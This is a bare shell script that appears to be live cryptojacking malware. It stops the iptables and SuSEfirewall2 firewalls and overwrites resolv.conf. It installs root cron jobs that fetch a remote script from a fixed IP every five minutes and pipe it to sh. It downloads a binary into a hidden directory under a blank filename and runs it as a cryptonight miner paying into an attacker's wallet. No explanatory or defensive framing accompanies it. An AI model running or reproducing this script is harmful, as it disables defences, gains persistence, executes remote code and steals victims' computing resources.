#!/bin/bash
/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop
echo 'nameserver 8.8.8.8'> /etc/resolv.conf
echo >> /etc/resolv.conf nameserver 8.8.4.4
echo "*/5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh" > /var/spool/cron/root
echo "*/5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh" >> /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh" > /var/spool/cron/crontabs/root
echo "*/5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh" >> /var/spool/cron/crontabs/root
   if [ ! -f "/usr/lib/local/.zh" ];
   then
        mkdir -p /usr/local/lib/.zh
        wget http://185.244.25.191/x -O /usr/local/lib/.zh/"  " ;cd /usr/local/lib/.zh/; chmod 777 "  ";./"  " -a cryptonight -o stratum+tcp://176.9.53.68:5555 -u 47rT5wSPhzE5HmgYieKEn8ac8S4Qne7JmZT4D2u3mFKPBmKBXF7frEsSmMd41MNuFNMTbc3xTdUzhJ51qi9XWDs1GnwUhKU -p x -k -B >>/dev/null &
            else
       curl -O- http://185.244.25.191/x -O /usr/lib/.zh/"  " ; chmod 777;./"  " -a cryptonight -o stratum+tcp://176.9.53.68:5555 -u 47rT5wSPhzE5HmgYieKEn8ac8S4Qne7JmZT4D2u3mFKPBmKBXF7frEsSmMd41MNuFNMTbc3xTdUzhJ51qi9XWDs1GnwUhKU -p x -k -B >>/dev/null &
         fi
